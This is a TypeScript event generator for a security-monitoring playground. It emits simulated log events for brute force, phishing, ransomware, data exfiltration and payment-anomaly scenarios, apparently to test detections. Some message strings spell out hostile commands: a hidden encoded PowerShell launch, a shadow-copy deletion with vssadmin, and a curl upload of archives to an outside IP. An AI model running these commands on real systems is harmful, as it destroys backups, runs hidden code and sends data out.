import type { ClientId, RiskEvent } from './types';

export type AttackType = 'brute' | 'phish' | 'powershell' | 'ransomware' | 'exfil' | 'anomalous_login' | 'payment';

export const ATTACK_TYPES: { id: AttackType; label: string; targetKind: 'host' | 'user' }[] = [
  { id: 'brute', label: 'Brute force', targetKind: 'host' },
  { id: 'phish', label: 'Phishing click', targetKind: 'user' },
  { id: 'powershell', label: 'Encoded PowerShell', targetKind: 'host' },
  { id: 'ransomware', label: 'Ransomware', targetKind: 'host' },
  { id: 'exfil', label: 'Data exfiltration', targetKind: 'host' },
  { id: 'anomalous_login', label: 'Anomalous login', targetKind: 'user' },
  { id: 'payment', label: 'Payment anomaly', targetKind: 'user' },
];

const DEFAULT_TARGETS: Record<ClientId, Record<AttackType, string>> = {
  meezan: { brute: 'ibanking-web-01', phish: 'customer.ayesha', powershell: 'branch-ws-07', ransomware: 'branch-ws-07', exfil: 'core-db-02', anomalous_login: 'staff.kamran', payment: 'ops.treasury' },
  shu: { brute: 'admissions-web-01', phish: 'student.fatima', powershell: 'lab-pc-04', ransomware: 'lab-pc-22', exfil: 'research-fs-01', anomalous_login: 'faculty.sara', payment: 'finance.fees' },
  contour: { brute: 'ci-build-02', phish: 'dev.usman', powershell: 'dev-ws-108', ransomware: 'dev-ws-108', exfil: 'git-srv-01', anomalous_login: 'dev.ali', payment: 'payroll.batch' },
};

/** Phishing domain per client. Contour has no dedicated indicator in the 7-indicator set; it reuses the registrar spoof. */
const PHISH_DOMAIN: Record<ClientId, string> = { meezan: 'meezan-fake-login.com', shu: 'shu-admissions-phish.com', contour: 'shu-admissions-phish.com' };

export const defaultTarget = (client: ClientId, type: AttackType) => DEFAULT_TARGETS[client][type];

export type GenEvent = Partial<RiskEvent> & { delayMs: number };

/**
 * Generates inert simulated events. Higher intensity (1-5) = more events and faster spacing.
 * `delayMs` is how long the playground waits before sending each event.
 */
export function generate(type: AttackType, client: ClientId, target: string, intensity: number, start = Date.now()): GenEvent[] {
  const lvl = Math.max(1, Math.min(5, Math.round(intensity)));
  const gap = Math.round(1400 / lvl); // ms between events
  const t = (i: number) => new Date(start + i * gap).toISOString();
  const base = { client, origin: 'playground' as const };
  const out: Omit<GenEvent, 'delayMs'>[] = [];
  const tgt = target.trim().toLowerCase() || defaultTarget(client, type);

  switch (type) {
    case 'brute': {
      const n = 5 + lvl * 2;
      for (let i = 0; i < n; i++) out.push({ ...base, ts: t(i), source: 'web', host: tgt, user: ['admin', 'root', 'test', 'operator', 'support'][i % 5], ip: '1.2.3.4', action: 'login_failed', message: `Failed login attempt ${i + 1} from 1.2.3.4` });
      break;
    }
    case 'phish': {
      const domain = PHISH_DOMAIN[client];
      for (let k = 0; k < Math.ceil(lvl / 2); k++) {
        out.push({ ...base, ts: t(out.length), source: 'proxy', host: 'mail-gw-01', user: tgt, ip: '203.0.113.88', domain, action: 'link_click', message: `Clicked link to ${domain}` });
      }
      out.push({ ...base, ts: t(out.length), source: 'web', host: 'portal-web-01', user: tgt, ip: '203.0.113.88', action: 'login_success', message: 'Login from untrusted proxy after link click' });
      break;
    }
    case 'powershell':
      for (let k = 0; k < lvl; k++) out.push({ ...base, ts: t(out.length), source: 'endpoint', host: tgt, user: 'local.user', process: 'powershell.exe', action: 'process_start', message: 'powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ==' });
      out.push({ ...base, ts: t(out.length), source: 'endpoint', host: tgt, process: 'powershell.exe', action: 'net_connect', ip: '198.51.100.99', message: 'Outbound connection to 198.51.100.99:443' });
      break;
    case 'ransomware':
      out.push({ ...base, ts: t(0), source: 'endpoint', host: tgt, process: 'free_tool_setup.exe', action: 'process_start', message: 'Installer launched from Downloads' });
      out.push({ ...base, ts: t(1), source: 'endpoint', host: tgt, process: 'vssadmin.exe', action: 'process_start', message: 'vssadmin delete shadows /all /quiet' });
      for (let k = 0; k < lvl; k++) out.push({ ...base, ts: t(2 + k), source: 'endpoint', host: tgt, process: 'free_tool_setup.exe', action: 'file_rename_bulk', meta: { count: 400 * (k + 2) }, message: `${400 * (k + 2)} files renamed with a new extension` });
      out.push({ ...base, ts: t(2 + lvl), source: 'gateway', host: tgt, action: 'dns_query', domain: 'ransomware-c2.net', message: 'DNS lookup for ransomware-c2.net' });
      break;
    case 'exfil':
      for (let k = 0; k < lvl; k++) out.push({ ...base, ts: t(k), source: 'endpoint', host: tgt, process: 'curl', action: 'net_upload', ip: '198.51.100.44', meta: { bytes: 500_000_000 * (k + 1) }, message: `curl -T export_part${k + 1}.zip https://198.51.100.44/upload (${(0.5 * (k + 1)).toFixed(1)} GB)` });
      break;
    case 'anomalous_login':
      for (let k = 0; k < Math.ceil(lvl / 2); k++) out.push({ ...base, ts: t(k), source: 'vpn', host: 'vpn-gw-01', user: tgt, ip: '198.51.100.99', meta: { geo: 'Foreign (baseline: Karachi, PK)' }, action: 'login_success', message: 'VPN login from foreign geography' });
      break;
    case 'payment':
      for (let k = 0; k < Math.ceil(lvl / 2); k++) out.push({ ...base, ts: t(k), source: 'payments', host: 'payments-gw-01', user: tgt, ip: '198.51.100.44', meta: { amount: 100000 * (k + 2), hour: 2 }, action: 'transfer', message: `Off-hours transfer of ${(100000 * (k + 2)).toLocaleString('en-US')} to external beneficiary at 02:${String(10 + k).padStart(2, '0')}` });
      break;
  }
  return out.map((e, i) => ({ ...e, delayMs: i === 0 ? 0 : gap }));
}
